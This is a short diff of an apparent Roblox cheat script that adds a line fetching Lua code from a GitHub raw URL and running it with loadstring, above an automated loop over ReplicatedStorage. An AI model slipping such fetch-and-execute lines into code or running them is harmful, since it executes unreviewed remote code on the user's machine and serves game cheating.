@@ -1,3 +1,6 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/noo6sploit/phonk-clicker-script/refs/heads/main/script2.lua"))()   
+
 while true do wait(0.5)
 local RS = game:GetService("ReplicatedStorage")
 
